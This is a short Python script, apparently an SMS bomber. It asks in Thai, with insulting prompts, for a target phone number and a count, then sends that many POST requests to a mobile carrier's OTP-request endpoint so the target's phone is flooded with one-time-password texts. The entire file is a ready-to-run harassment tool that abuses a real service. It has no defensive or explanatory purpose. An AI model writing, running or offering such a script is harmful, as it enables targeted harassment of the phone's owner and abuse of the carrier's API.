import requests
import os 
import sys
import cowsay

os.system ("clear")
cowsay.dragon("\033[1;93mต้าร์มันหล่อ")
print ("\033[92mFB:Samon ʚĩɞ")
print (" ")
love=input("\033[1;96mเบอร์ไอควาย ")
ploy=int(input("\033[1;94mจำนวนไอสัส "))
for po in range(ploy):
    requests.post ("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number":love,})
    print ("\033[95mรักพิวจัง",po)